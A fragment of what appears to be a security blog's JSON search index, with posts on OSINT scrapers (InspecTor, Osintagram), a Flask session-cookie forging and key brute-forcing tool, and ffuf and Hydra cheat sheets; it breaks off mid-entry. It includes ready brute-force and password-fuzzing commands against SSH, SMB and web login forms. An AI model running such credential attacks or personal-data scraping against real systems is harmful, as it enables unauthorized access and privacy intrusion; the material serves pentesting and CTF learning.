the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s 